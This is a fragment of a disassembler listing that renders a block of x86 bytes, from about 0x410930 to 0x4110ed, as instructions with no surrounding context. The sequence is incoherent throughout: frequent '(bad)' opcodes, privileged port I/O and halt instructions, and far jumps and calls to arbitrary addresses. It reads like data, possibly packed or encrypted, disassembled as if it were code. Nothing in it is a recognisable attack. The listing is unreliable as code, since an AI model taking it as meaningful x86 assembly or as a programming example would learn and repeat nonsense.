  410930:	hlt    
  410931:	ret    
  410932:	clc    
  410933:	add    edx,eax
  410935:	das    
  410936:	(bad)  
  410937:	in     al,0xd7
  410939:	scas   al,BYTE PTR es:[edi]
  41093a:	pop    ds
  41093b:	bound  eax,QWORD PTR [ecx]
  41093d:	sub    eax,0x7ecbf255
  410942:	cmc    
  410943:	in     eax,dx
  410944:	push   ecx
  410945:	pop    esp
  410946:	ins    BYTE PTR es:[edi],dx
  410947:	iret   
  410948:	add    al,0xd0
  41094a:	int3   
  41094b:	mov    dh,cl
  41094d:	(bad)  
  41094e:	sbb    BYTE PTR [ebx-0x19250608],al
  410954:	inc    edx
  410955:	(bad)  
  410957:	in     al,0x17
  410959:	je     0x410992
  41095b:	sbb    al,0x50
  41095d:	cmp    cl,BYTE PTR [esi-0x67]
  410960:	jbe    0x410971
  410962:	inc    edi
  410963:	sub    ecx,DWORD PTR [ebx]
  410965:	sbb    eax,0x622e6363
  41096a:	mov    BYTE PTR [ebx-0x2c],dl
  41096d:	pusha  
  41096e:	pop    ss
  41096f:	xchg   edi,eax
  410970:	or     BYTE PTR [edx+0x29],0x73
  410974:	adc    al,0x62
  410976:	cwde   
  410977:	sahf   
  410978:	ja     0x4109f6
  41097a:	push   0xfa3f23bc
  41097f:	test   eax,0xfddb280e
  410984:	push   0x93d2630b
  410989:	into   
  41098a:	fnstsw WORD PTR [eax-0x45]
  41098d:	loope  0x4109d5
  41098f:	cmp    BYTE PTR [eax+ebx*8],0x40
  410993:	mov    edi,0xc1daf59e
  410998:	mov    ecx,0xd14d0d39
  41099d:	sbb    DWORD PTR [esi+0x39100d1f],0xffffffba
  4109a4:	pop    esp
  4109a5:	dec    edx
  4109a6:	push   ecx
  4109a7:	push   edi
  4109a8:	lock xor DWORD PTR [eax-0x408669a3],edx
  4109af:	add    ch,BYTE PTR [edi-0x3b]
  4109b2:	mov    dl,BYTE PTR [eax+0x4a43953c]
  4109b8:	lock or edi,ebp
  4109bb:	fist   DWORD PTR [esi+0x2b]
  4109be:	bound  esi,QWORD PTR [esp+eax*8]
  4109c1:	mov    ds,WORD PTR [ebx-0x553c8d9]
  4109c7:	pop    ss
  4109c8:	icebp  
  4109c9:	mov    edx,0x83a92cb0
  4109ce:	fs sbb eax,0xda20237b
  4109d4:	retf   0x8530
  4109d7:	or     esp,DWORD PTR [eax+0x59]
  4109da:	xor    eax,0xe8cf5822
  4109df:	idiv   cl
  4109e1:	stc    
  4109e2:	popa   
  4109e3:	inc    esi
  4109e4:	ds pop ss
  4109e6:	pop    esp
  4109e7:	imul   DWORD PTR [eax-0x722cf118]
  4109ed:	push   DWORD PTR [ecx]
  4109ef:	xchg   ecx,eax
  4109f0:	mov    ds:0x94c05d50,eax
  4109f5:	imul   ecx,DWORD PTR ds:0x731bf906,0xfd40f012
  4109ff:	pop    ecx
  410a00:	mov    dh,0x4c
  410a02:	sub    edi,DWORD PTR ds:0xf12c96a7
  410a08:	add    dh,BYTE PTR [edx-0x67]
  410a0b:	xlat   BYTE PTR ds:[ebx]
  410a0c:	mov    eax,0x41deadeb
  410a11:	sub    esp,esi
  410a13:	inc    esi
  410a14:	cmp    DWORD PTR [edi-0x9a60a92],ecx
  410a1a:	mov    ss,WORD PTR [ebx-0x22]
  410a1d:	xor    ah,ah
  410a1f:	loope  0x410a16
  410a21:	sub    BYTE PTR [edx-0x7a],dl
  410a24:	(bad)  
  410a25:	push   edi
  410a26:	daa    
  410a27:	adc    DWORD PTR [eax-0x3d],0x6
  410a2b:	mov    cl,0x48
  410a2d:	mov    ebp,0x387f4271
  410a32:	aad    0xe9
  410a34:	mov    cl,BYTE PTR [edi]
  410a36:	dec    edx
  410a37:	inc    esp
  410a38:	(bad)  
  410a39:	in     al,dx
  410a3a:	leave  
  410a3b:	xchg   ebx,eax
  410a3c:	xchg   esi,eax
  410a3d:	shl    bp,cl
  410a40:	jb     0x410aa4
  410a42:	mov    esp,0xbc1c8d1d
  410a47:	loope  0x410a86
  410a49:	in     eax,0x87
  410a4b:	shl    DWORD PTR [edi-0x18],0x9e
  410a4f:	ret    
  410a50:	int3   
  410a51:	sbb    DWORD PTR [ebp+ebp*4+0x3e6a8473],esi
  410a58:	push   es
  410a59:	xchg   ebp,eax
  410a5a:	inc    esp
  410a5b:	std    
  410a5c:	mov    ah,0x6
  410a5e:	or     eax,0xad7db652
  410a63:	retf   
  410a64:	lods   al,BYTE PTR ds:[esi]
  410a65:	and    eax,0x361f590b
  410a6a:	mov    esp,0x8fbf2e4a
  410a6f:	xchg   esp,eax
  410a70:	xor    eax,0x729792b
  410a75:	arpl   WORD PTR [ebp+eiz*1+0x58a65621],ax
  410a7c:	pop    ebp
  410a7d:	cmp    ah,BYTE PTR [ebp-0x51]
  410a80:	fiadd  WORD PTR [edi-0xa40ee0f]
  410a86:	icebp  
  410a87:	frstpm(287 only) 
  410a89:	or     ah,BYTE PTR [edx+edi*2-0x2]
  410a8d:	xchg   ecx,eax
  410a8e:	or     al,0xe7
  410a90:	ins    DWORD PTR es:[edi],dx
  410a91:	retf   
  410a92:	pop    edi
  410a93:	out    dx,al
  410a94:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  410a96:	test   dl,ch
  410a98:	mov    esi,0xf178b20d
  410a9d:	test   al,0xc6
  410a9f:	mov    bh,0x15
  410aa1:	sbb    cl,BYTE PTR [eax-0x6d5e2d6]
  410aa7:	sbb    DWORD PTR [edx-0x8],edi
  410aaa:	sub    dh,BYTE PTR [esp+ebp*1]
  410aad:	pop    eax
  410aae:	xchg   BYTE PTR [ebx+0x22ffa253],bl
  410ab4:	pop    edx
  410ab5:	leave  
  410ab6:	xchg   ebp,eax
  410ab7:	cwde   
  410ab8:	aam    0x40
  410aba:	adc    al,0xce
  410abc:	pop    es
  410abd:	test   esi,esp
  410abf:	aas    
  410ac0:	mov    edx,0x640ec16f
  410ac5:	or     DWORD PTR [edx],0xe39bb0b6
  410acb:	ins    DWORD PTR es:[edi],dx
  410acc:	mov    al,0x79
  410ace:	pop    edx
  410acf:	stos   DWORD PTR es:[edi],eax
  410ad0:	jb     0x410ad7
  410ad2:	push   esi
  410ad3:	push   edi
  410ad4:	int3   
  410ad5:	cmp    DWORD PTR [edx],eax
  410ad7:	jbe    0x410ad5
  410ad9:	mov    ds:0x46766e68,eax
  410ade:	ret    0xb85c
  410ae1:	mov    al,BYTE PTR [ebp-0x6]
  410ae4:	add    esi,esp
  410ae6:	cmp    al,0xa4
  410ae8:	imul   edx,DWORD PTR [edx-0x72],0x4ee28b1b
  410aef:	xchg   edi,eax
  410af0:	out    0x9c,al
  410af2:	into   
  410af3:	(bad)  
  410af4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410af5:	push   cs
  410af6:	lock xor esp,DWORD PTR [ebp+0x25]
  410afa:	push   ecx
  410afb:	xor    eax,DWORD PTR [edx-0x757bc89b]
  410b01:	out    dx,eax
  410b02:	cmp    al,0xbb
  410b04:	addr16 push ebx
  410b06:	rcr    BYTE PTR [eax-0x33],0x4
  410b0a:	xor    ebx,edi
  410b0c:	retf   0x48ba
  410b0f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410b10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410b11:	inc    edx
  410b12:	xchg   esp,eax
  410b13:	int    0x7a
  410b15:	ins    BYTE PTR es:[edi],dx
  410b16:	dec    ecx
  410b17:	mov    eax,ecx
  410b19:	inc    esi
  410b1a:	jl     0x410b4c
  410b1c:	or     esp,esi
  410b1e:	or     ecx,DWORD PTR [ebx-0x22cceccb]
  410b24:	test   al,0x10
  410b26:	je     0x410af5
  410b28:	sub    BYTE PTR [esi],dl
  410b2a:	xchg   DWORD PTR ds:0x78032e72,ecx
  410b30:	cmc    
  410b31:	adc    DWORD PTR [ebx+0x25],0x7024770e
  410b38:	jbe    0x410ba1
  410b3a:	icebp  
  410b3b:	ins    BYTE PTR es:[edi],dx
  410b3c:	xchg   DWORD PTR [eax+0x2b],ebp
  410b3f:	out    0xc8,al
  410b41:	out    dx,eax
  410b42:	rol    BYTE PTR [eax],cl
  410b44:	add    ebx,esi
  410b46:	push   edx
  410b47:	jmp    0x410b77
  410b49:	sub    BYTE PTR ds:0xf37b54a3,al
  410b4f:	mov    BYTE PTR [esi-0x11],cl
  410b52:	std    
  410b53:	mov    ecx,0xa69ba6dc
  410b58:	sar    dh,cl
  410b5a:	ror    BYTE PTR [esi-0x4],0x50
  410b5e:	xor    DWORD PTR [ecx+0x73],esp
  410b61:	out    0x78,al
  410b63:	cmp    ebp,edx
  410b65:	cmp    al,0xac
  410b67:	stos   DWORD PTR es:[edi],eax
  410b68:	inc    BYTE PTR [eax]
  410b6a:	xchg   esp,eax
  410b6b:	addr16 mov dl,0x3d
  410b6e:	es leave 
  410b70:	rcr    ah,0x2a
  410b73:	jbe    0x410b29
  410b75:	dec    ebx
  410b76:	enter  0x3083,0x13
  410b7a:	jae    0x410bf4
  410b7c:	dec    eax
  410b7d:	push   edi
  410b7e:	sub    DWORD PTR [eax],esp
  410b80:	out    dx,al
  410b81:	gs mov edx,0x7b149b79
  410b87:	or     eax,0x4a7e85d6
  410b8c:	popa   
  410b8d:	stos   DWORD PTR es:[edi],eax
  410b8e:	adc    al,cl
  410b90:	leave  
  410b91:	push   ss
  410b92:	mov    dh,0x5c
  410b94:	repz fucomp st(2)
  410b97:	fcomp  DWORD PTR [eax]
  410b99:	ins    DWORD PTR es:[edi],dx
  410b9a:	adc    edi,DWORD PTR [edx]
  410b9c:	and    edx,DWORD PTR [ecx]
  410b9e:	shl    BYTE PTR [eax-0x5d],1
  410ba1:	sub    BYTE PTR [esi-0x67],cl
  410ba4:	mov    bh,0x8d
  410ba6:	cmp    ecx,ebx
  410ba8:	ds int 0x41
  410bab:	cmp    cl,BYTE PTR [edi]
  410bad:	clc    
  410bae:	loop   0x410b64
  410bb0:	sub    BYTE PTR [eax],al
  410bb2:	lea    eax,[edx+0x7fdef410]
  410bb8:	xor    eax,edx
  410bba:	jb     0x410bea
  410bbc:	add    dl,BYTE PTR [edi-0x2286412c]
  410bc2:	or     eax,DWORD PTR [edi-0x1f]
  410bc5:	bound  ebx,QWORD PTR [ebp+0x5c]
  410bc8:	add    eax,0xcd02b4a4
  410bcd:	cdq    
  410bce:	sbb    ebp,DWORD PTR [esi]
  410bd0:	jns    0x410b7f
  410bd2:	and    ah,BYTE PTR [esi+0x55]
  410bd5:	mov    eax,ds:0x17665287
  410bda:	rol    al,cl
  410bdc:	in     al,0xfa
  410bde:	push   esi
  410bdf:	enter  0x9db5,0x72
  410be3:	mov    ds:0xf6a01cdd,al
  410be8:	inc    esp
  410be9:	jecxz  0x410b97
  410beb:	je     0x410c15
  410bed:	(bad)  
  410bee:	shl    BYTE PTR [edx+0x65],0x38
  410bf2:	jmp    FWORD PTR [ebx]
  410bf4:	push   cs
  410bf5:	xlat   BYTE PTR ds:[ebx]
  410bf6:	xor    eax,0xddce43a3
  410bfb:	es fcmovb st,st(4)
  410bfe:	sahf   
  410bff:	jmp    0x410bde
  410c01:	mov    WORD PTR [ebx+ebx*2+0x6307ad8f],ss
  410c08:	imul   esi,DWORD PTR ds:0x4d81e0a4,0x47eba7ba
  410c12:	std    
  410c13:	xchg   esp,eax
  410c14:	add    BYTE PTR [edx+0x38],0x81
  410c18:	rcl    BYTE PTR [edx-0x63],1
  410c1b:	and    DWORD PTR [ecx+0x3b92a7f7],ebp
  410c21:	sub    edx,eax
  410c23:	cdq    
  410c24:	mov    dh,0x34
  410c26:	call   0x41adaca2
  410c2b:	sbb    eax,0x5b1bbcd5
  410c30:	fcom   QWORD PTR [bx+si-0xf2b]
  410c35:	data16 arpl WORD PTR [ebp-0x67cf2d5c],dx
  410c3c:	dec    esp
  410c3d:	cmc    
  410c3e:	test   DWORD PTR [esi],eax
  410c40:	outs   dx,BYTE PTR ds:[esi]
  410c41:	pop    ebx
  410c42:	push   ebp
  410c43:	add    eax,0xa42d254a
  410c48:	add    cl,BYTE PTR [ecx-0x2b]
  410c4b:	dec    esi
  410c4c:	cld    
  410c4d:	sub    cl,ah
  410c4f:	repz scas ax,WORD PTR es:[edi]
  410c52:	push   edx
  410c53:	sahf   
  410c54:	adc    eax,0x17aa15b3
  410c59:	jb     0x410c7b
  410c5b:	cld    
  410c5c:	into   
  410c5d:	mov    gs,WORD PTR [ebx]
  410c5f:	inc    edx
  410c60:	clc    
  410c61:	popa   
  410c62:	dec    ecx
  410c63:	aaa    
  410c64:	or     ecx,DWORD PTR [edx]
  410c66:	inc    esp
  410c67:	push   ss
  410c68:	out    dx,eax
  410c69:	and    ah,bh
  410c6b:	pop    esp
  410c6c:	xlat   BYTE PTR ds:[ebx]
  410c6d:	inc    eax
  410c6e:	mov    edx,0xaaf1152d
  410c73:	cmp    DWORD PTR [edx+0x36ac2ee3],edx
  410c79:	xchg   ebx,eax
  410c7a:	(bad)  
  410c7b:	(bad)  
  410c7d:	jg     0x410ce5
  410c7f:	aaa    
  410c80:	inc    edx
  410c81:	add    al,BYTE PTR [edx-0x4e08df80]
  410c87:	and    eax,0x293637df
  410c8c:	sahf   
  410c8d:	xchg   BYTE PTR [eax-0x1885e39f],ch
  410c93:	es gs pop es
  410c96:	jo     0x410c6b
  410c98:	dec    ebx
  410c99:	adc    DWORD PTR [eax-0x23],esp
  410c9c:	add    bl,0xd3
  410c9f:	dec    esi
  410ca0:	out    dx,al
  410ca1:	int    0x93
  410ca3:	invd   
  410ca5:	mov    dl,dl
  410ca7:	jno    0x410cf3
  410ca9:	push   ebx
  410caa:	push   ebp
  410cab:	mov    edi,DWORD PTR [eax]
  410cad:	inc    edi
  410cae:	mov    ecx,0x436dbf7
  410cb3:	test   al,al
  410cb5:	pop    ebp
  410cb6:	out    dx,eax
  410cb7:	and    cl,BYTE PTR [edi+0x389ed76d]
  410cbd:	call   0xf1b8225c
  410cc2:	jne    0x410c8d
  410cc4:	test   bl,al
  410cc6:	mov    cl,0x39
  410cc8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410cc9:	mov    ds:0x6261cdd0,eax
  410cce:	jae    0x410d20
  410cd0:	cdq    
  410cd1:	mov    ds:0x16ad1b0d,al
  410cd6:	push   0xb40c812f
  410cdb:	pop    es
  410cdc:	mov    ah,0x88
  410cde:	jmp    0x101c9b33
  410ce3:	or     BYTE PTR [eax],0xa1
  410ce6:	or     al,0x25
  410ce8:	into   
  410ce9:	(bad)  
  410cea:	pop    ebx
  410ceb:	mov    cl,0x3
  410ced:	adc    eax,0xcb383c61
  410cf2:	inc    edi
  410cf3:	inc    edx
  410cf4:	cld    
  410cf5:	mov    ds:0xef00339c,eax
  410cfa:	push   ss
  410cfb:	dec    esi
  410cfc:	out    dx,al
  410cfd:	and    bh,BYTE PTR [edx]
  410cff:	mov    ecx,0xfedb7697
  410d04:	xor    BYTE PTR [eax],0x73
  410d07:	inc    ebx
  410d08:	mov    esi,edx
  410d0a:	fcmovne st,st(6)
  410d0c:	fild   QWORD PTR [esi-0x6041c6d6]
  410d12:	pop    eax
  410d13:	cdq    
  410d14:	clc    
  410d15:	or     ch,BYTE PTR [eax]
  410d17:	imul   ebx,DWORD PTR [ebx],0xd40eab23
  410d1d:	add    DWORD PTR ds:[ebx],0xf0453f32
  410d24:	aam    0x50
  410d26:	(bad)  
  410d27:	add    BYTE PTR [edi-0x269ca8b6],dh
  410d2d:	stos   DWORD PTR es:[edi],eax
  410d2e:	mov    edx,esp
  410d30:	sub    DWORD PTR [edi+0x5dfe6935],edx
  410d36:	or     al,0xc7
  410d39:	dec    esi
  410d3a:	inc    ebx
  410d3b:	cmp    al,0x73
  410d3d:	aam    0xa8
  410d3f:	out    dx,al
  410d40:	xor    al,0xf0
  410d42:	in     eax,dx
  410d43:	inc    esi
  410d44:	loop   0x410ce8
  410d46:	int3   
  410d47:	test   eax,0x14b4f2d0
  410d4c:	sub    BYTE PTR [edi-0x39],bh
  410d4f:	hlt    
  410d50:	je     0x410cf7
  410d52:	ins    DWORD PTR es:[edi],dx
  410d53:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410d54:	sbb    esp,DWORD PTR [ebx+0x1a]
  410d57:	and    cl,ah
  410d59:	cs loope 0x410d6d
  410d5c:	enter  0x531f,0x9d
  410d60:	vmovss xmm4,xmm0,xmm4
  410d64:	pop    ss
  410d65:	push   0xffffff9b
  410d67:	(bad)  
  410d69:	ins    DWORD PTR es:[edi],dx
  410d6a:	pop    ebp
  410d6b:	adc    al,BYTE PTR [ebp-0x505cbae5]
  410d71:	mov    ds:0x1c781e1d,eax
  410d76:	cwde   
  410d77:	inc    esi
  410d78:	into   
  410d79:	dec    ebp
  410d7a:	je     0x410d67
  410d7c:	sub    DWORD PTR [edi],0xe3220077
  410d82:	fadd   DWORD PTR [ebx+0x1b]
  410d85:	aaa    
  410d86:	dec    edx
  410d87:	lods   al,BYTE PTR ds:[esi]
  410d88:	xor    ah,cl
  410d8a:	mov    BYTE PTR [ebx],cl
  410d8c:	adc    ebx,DWORD PTR [ebx]
  410d8e:	or     DWORD PTR [esi+0x71],esi
  410d91:	addr16 inc edi
  410d93:	jl     0x410d84
  410d95:	(bad)  
  410d96:	jmp    0x83e2caf2
  410d9b:	jnp    0x410e13
  410d9d:	mul    DWORD PTR [edi]
  410d9f:	dec    ebx
  410da0:	dec    esi
  410da1:	lods   al,BYTE PTR ds:[esi]
  410da2:	mov    ss,WORD PTR [edi-0x6]
  410da5:	loopne 0x410da6
  410da7:	or     bl,BYTE PTR [ebp-0x6]
  410daa:	xchg   edx,eax
  410dab:	jg     0x410d7e
  410dad:	dec    eax
  410dae:	cmp    dl,bl
  410db0:	mov    dl,0xeb
  410db2:	fiadd  DWORD PTR [ecx-0x5c]
  410db5:	dec    esi
  410db6:	retf   0xf987
  410db9:	sub    al,0x69
  410dbb:	mov    al,ds:0x5f451c6c
  410dc0:	xchg   edi,eax
  410dc1:	dec    ecx
  410dc2:	mov    dl,0x6d
  410dc4:	fld    QWORD PTR [edx]
  410dc6:	loop   0x410e47
  410dc8:	add    dh,BYTE PTR [ebp-0x6b]
  410dcb:	cld    
  410dcc:	jg     0x410d7d
  410dce:	add    al,0x24
  410dd0:	jl     0x410d67
  410dd2:	jmp    0xd8f36946
  410dd7:	sti    
  410dd8:	mov    WORD PTR [ecx+0x19],ss
  410ddb:	mov    ch,0x38
  410ddd:	stc    
  410dde:	xor    eax,0xd5102c56
  410de3:	adc    edi,DWORD PTR [esi]
  410de5:	loopne 0x410daa
  410de7:	add    ebp,esi
  410de9:	push   esp
  410dea:	pop    esp
  410deb:	inc    eax
  410dec:	jns    0x410e11
  410dee:	into   
  410def:	es jbe 0x410e4f
  410df2:	mov    BYTE PTR [ecx+0x10104c75],bh
  410df8:	(bad)  
  410df9:	xor    eax,0xc8259e3d
  410dfe:	pop    edi
  410dff:	inc    esp
  410e00:	fsubr  DWORD PTR [ebx]
  410e02:	jmp    0x410d91
  410e04:	sbb    esi,edi
  410e06:	xor    al,0x61
  410e08:	mov    bh,0x4f
  410e0a:	xchg   edi,eax
  410e0b:	sub    BYTE PTR [eax],cl
  410e0d:	js     0x410dc9
  410e0f:	les    esi,FWORD PTR [ecx-0x3c]
  410e12:	outs   dx,DWORD PTR ds:[esi]
  410e13:	neg    BYTE PTR [esi+ecx*2+0x4b798c8e]
  410e1a:	es sahf 
  410e1c:	cmp    al,0x23
  410e1e:	mov    ah,BYTE PTR [ecx+edi*2-0x25dedf6f]
  410e25:	mov    bl,0x2b
  410e27:	(bad)
  410e2a:	inc    edi
  410e2b:	loopne 0x410e17
  410e2d:	jmp    0x410e1a
  410e2f:	pop    ss
  410e30:	sbb    esi,DWORD PTR [ecx-0x46677e6a]
  410e36:	cmp    al,0xdb
  410e38:	xor    al,0xe5
  410e3b:	dec    eax
  410e3c:	mov    esi,0x7c46a5ab
  410e41:	jmp    0x46eeac80
  410e46:	add    al,0xd6
  410e48:	dec    ebp
  410e49:	sub    BYTE PTR [ebx-0x59065dbb],dl
  410e4f:	mov    bl,0x68
  410e51:	push   esi
  410e52:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410e53:	loopne 0x410e1b
  410e55:	xchg   DWORD PTR [eax-0x1c40e2f5],ebp
  410e5b:	pop    edi
  410e5c:	cs jbe 0x410ecb
  410e5f:	ins    DWORD PTR es:[edi],dx
  410e60:	hlt    
  410e61:	iret   
  410e62:	mov    ebx,0xb1f48fd0
  410e67:	outs   dx,BYTE PTR ds:[esi]
  410e68:	sbb    eax,0x6d69caa8
  410e6d:	lds    ecx,FWORD PTR [ebx+0x3f4ff191]
  410e73:	and    al,0x4b
  410e75:	and    al,BYTE PTR [edi+eax*2+0x21f14939]
  410e7c:	cli    
  410e7d:	mov    ds,WORD PTR [edi-0x3]
  410e80:	test   DWORD PTR [ebx+0x65],ebx
  410e83:	scas   eax,DWORD PTR es:[edi]
  410e84:	push   ecx
  410e85:	xor    BYTE PTR [edi],0xf
  410e88:	imul   ebp,DWORD PTR [edi],0xf3c5a07e
  410e8e:	push   ss
  410e8f:	stos   BYTE PTR es:[edi],al
  410e90:	sub    BYTE PTR [ebx],0x3f
  410e93:	or     cl,ah
  410e95:	scas   eax,DWORD PTR es:[edi]
  410e96:	sbb    eax,0x91a9c150
  410e9b:	mov    ah,0x1f
  410e9d:	sbb    DWORD PTR [edi+0x66],eax
  410ea0:	jecxz  0x410e3d
  410ea2:	dec    edi
  410ea3:	push   0x864ccd23
  410ea8:	sub    DWORD PTR [edi+0x26f632ba],eax
  410eae:	push   eax
  410eaf:	cmc    
  410eb0:	lock hlt 
  410eb2:	imul   eax,DWORD PTR fs:[eax-0x58],0xffffffa9
  410eb7:	jmp    0x410e96
  410eb9:	jne    0x410e52
  410ebb:	or     edi,edi
  410ebd:	xor    al,0x72
  410ebf:	jmp    0xc5678acd
  410ec4:	repnz mov WORD PTR [eax+edx*2-0x2f0cde8],gs
  410ecc:	jl     0x410ed5
  410ece:	mov    edi,0xf5545d6b
  410ed3:	xchg   ebx,eax
  410ed4:	xchg   DWORD PTR [esi+0xc],ecx
  410ed7:	push   ebp
  410ed8:	int    0x4b
  410eda:	cli    
  410edb:	in     al,dx
  410edc:	dec    ecx
  410edd:	push   ds
  410ede:	xor    al,0x7a
  410ee0:	xor    eax,0x3596a7dd
  410ee5:	ds mov bl,0xda
  410ee8:	sbb    BYTE PTR [ebp-0x4a20c2d4],ah
  410eee:	test   BYTE PTR [ebx],0xc
  410ef1:	gs mov cl,0x7e
  410ef4:	fldcw  WORD PTR [edi+0x29]
  410ef7:	xchg   esp,eax
  410ef8:	fdivr  st(2),st
  410efa:	cmp    DWORD PTR [esi-0x6cd3b676],edx
  410f00:	sub    DWORD PTR [ecx],esp
  410f02:	ds pop ss
  410f04:	sub    BYTE PTR [edi],ah
  410f06:	pop    eax
  410f07:	(bad)  
  410f09:	imul   esi,eax,0xffffffa1
  410f0c:	cmp    DWORD PTR [esi],esi
  410f0e:	cs scas eax,DWORD PTR es:[edi]
  410f10:	out    0xc8,eax
  410f12:	fwait
  410f13:	pop    eax
  410f14:	and    BYTE PTR [eax+0x7e],bh
  410f17:	lock mov eax,ds:0x9ab06f78
  410f1d:	xchg   ebp,eax
  410f1e:	hlt    
  410f1f:	in     al,dx
  410f20:	cmp    esi,DWORD PTR [esi-0x1a1d32b9]
  410f26:	pop    ds
  410f27:	push   es
  410f28:	xor    DWORD PTR [eax-0x11],edx
  410f2b:	push   ds
  410f2c:	imul   esi,DWORD PTR [esi],0xffffffa4
  410f2f:	pop    ebp
  410f30:	dec    esi
  410f31:	inc    esi
  410f32:	cmp    eax,DWORD PTR [eax-0x2f]
  410f35:	or     eax,0x2faa2950
  410f3a:	sub    dl,BYTE PTR [esi-0x21]
  410f3d:	mov    esi,0x2a9bd066
  410f42:	stos   BYTE PTR es:[edi],al
  410f43:	add    DWORD PTR [edx],eax
  410f45:	and    BYTE PTR [eax+0x33ad0a1d],ch
  410f4b:	ds push ds
  410f4d:	mov    esp,0x14a3352b
  410f52:	test   esp,edx
  410f54:	xchg   ebx,eax
  410f55:	out    dx,al
  410f56:	idiv   BYTE PTR [eax+0x17]
  410f59:	fbstp  TBYTE PTR [ebx+esi*2+0x20]
  410f5d:	cmp    DWORD PTR [edx-0x3a386515],0xd
  410f64:	sub    dl,al
  410f66:	ds dec ecx
  410f68:	push   edx
  410f69:	and    DWORD PTR [ebp-0x6c06f852],0x1b
  410f70:	aam    0xf9
  410f72:	sahf   
  410f73:	in     al,0x40
  410f75:	xor    eax,0x4e99aaa2
  410f7a:	loopne 0x410fb1
  410f7c:	xor    eax,edx
  410f7e:	add    DWORD PTR [di+0x5389],edi
  410f83:	ins    BYTE PTR es:[edi],dx
  410f84:	mov    dl,0xd7
  410f86:	(bad)  
  410f87:	enter  0x47ba,0xc3
  410f8b:	scas   eax,DWORD PTR es:[edi]
  410f8c:	push   edi
  410f8d:	or     BYTE PTR [edx+ebp*4],0x7f
  410f91:	push   0x6d12a68f
  410f96:	sub    DWORD PTR [edi],edi
  410f98:	jmp    0x590b:0xeecdff10
  410f9f:	mov    BYTE PTR [edx-0x495d36e2],cl
  410fa5:	lahf   
  410fa6:	mov    esp,0x3e562a32
  410fab:	mov    DWORD PTR [esi-0x419ff3b0],0xcad83e7b
  410fb5:	dec    ebx
  410fb6:	dec    esi
  410fb7:	std    
  410fb8:	cdq    
  410fb9:	inc    ebp
  410fba:	or     ah,BYTE PTR [ecx-0x3b]
  410fbd:	adc    DWORD PTR [edi-0x64],ebp
  410fc0:	add    DWORD PTR [edi+0x7ed68bdb],edi
  410fc6:	sbb    al,BYTE PTR [edx]
  410fc8:	loope  0x410f5e
  410fca:	loop   0x410ff8
  410fcc:	dec    edx
  410fcd:	call   0x205d:0x73f3726a
  410fd4:	push   edi
  410fd5:	pop    ebx
  410fd6:	and    bh,0xe9
  410fd9:	je     0x410f98
  410fdb:	clc    
  410fdc:	and    BYTE PTR [edi],ah
  410fde:	jae    0x410f8f
  410fe0:	sbb    eax,0x7cdbe925
  410fe5:	cmp    eax,esi
  410fe7:	hlt    
  410fe8:	fst    DWORD PTR [esi-0x2ad07647]
  410fee:	push   eax
  410fef:	inc    eax
  410ff0:	mov    eax,0xda5cb2b8
  410ff5:	jmp    0x4265e76d
  410ffa:	adc    ecx,esi
  410ffc:	and    dh,dh
  410ffe:	xor    DWORD PTR [ebp+0x76],edx
  411001:	aaa    
  411002:	daa    
  411003:	(bad)  
  411004:	(bad)  
  411005:	ficomp WORD PTR [esi+edx*2+0x2]
  411009:	sbb    eax,0xd2b12252
  41100e:	call   0x909d:0x9b4acf67
  411015:	call   0x13fb5623
  41101a:	out    dx,eax
  41101b:	push   ecx
  41101c:	mov    ds:0xc744a418,eax
  411021:	mov    al,0xf8
  411023:	xor    esp,edx
  411025:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411026:	iret   
  411027:	sub    al,0x67
  411029:	jno    0x411099
  41102b:	call   0xc1b2569
  411030:	arpl   di,sp
  411032:	push   esi
  411033:	fimul  WORD PTR [esi-0x6f]
  411036:	jb     0x411015
  411038:	add    edx,esi
  41103a:	pop    ss
  41103b:	push   cs
  41103c:	rol    DWORD PTR [edx],cl
  41103e:	adc    bh,cl
  411040:	inc    ebx
  411041:	outs   dx,DWORD PTR ds:[esi]
  411042:	xor    eax,edi
  411044:	int3   
  411045:	leave  
  411046:	mov    cl,0x3f
  411048:	fsubr  QWORD PTR [edx-0x6f96e9f1]
  41104e:	push   cs
  41104f:	pushf  
  411050:	mov    WORD PTR [eax+0x602a9614],gs
  411056:	mov    ebp,0x1a814420
  41105b:	mov    eax,DWORD PTR [ebp-0x3f843c78]
  411061:	mov    dl,0x9d
  411063:	aad    0x18
  411065:	add    dh,BYTE PTR [ebp-0x260d4b41]
  41106b:	mov    dl,0xef
  41106d:	outs   dx,BYTE PTR ds:[esi]
  41106e:	push   es
  41106f:	loop   0x411021
  411071:	retf   0x2990
  411074:	aaa    
  411075:	cdq    
  411076:	mov    ebx,0xf866e679
  41107b:	lods   al,BYTE PTR ds:[esi]
  41107c:	add    DWORD PTR [eax],esp
  41107e:	lahf   
  41107f:	jmp    0x411018
  411081:	repnz adc BYTE PTR [esi+0x16f6e042],ch
  411088:	lods   eax,DWORD PTR ds:[esi]
  411089:	fimul  DWORD PTR [eax+0x35300a4]
  41108f:	aad    0x96
  411091:	test   eax,0xee963a47
  411096:	sbb    edi,DWORD PTR [edx]
  411098:	leave  
  411099:	dec    edx
  41109a:	or     eax,0x63a9f238
  41109f:	sar    BYTE PTR [esi],cl
  4110a1:	cmpxchg cl,al
  4110a4:	mov    ebx,0xc8393d7c
  4110a9:	lahf   
  4110aa:	jae    0x4110ab
  4110ac:	cmp    DWORD PTR [ebp+0x62a071b7],0xdac7e8e7
  4110b6:	sub    DWORD PTR [ebp+0x61f82edb],edi
  4110bc:	dec    edi
  4110bd:	push   esp
  4110be:	out    dx,eax
  4110bf:	rcr    BYTE PTR [eax+edi*4],cl
  4110c2:	int    0xb1
  4110c4:	or     dh,bl
  4110c6:	and    edx,DWORD PTR [eax-0x437a3378]
  4110cc:	pop    DWORD PTR [eax-0x4415462e]
  4110d2:	(bad)  
  4110d3:	adc    DWORD PTR es:[esi+esi*1-0x255cea10],edx
  4110db:	pop    ds
  4110dc:	hlt    
  4110dd:	cdq    
  4110de:	sub    al,0xe4
  4110e0:	adc    eax,0x7607ee98
  4110e5:	and    al,0xad
  4110e7:	mov    edx,0x767ffcb8
  4110ec:	ins    BYTE PTR es:[edi],dx
  4110ed:	les    ecx,FWORD PTR [edi]
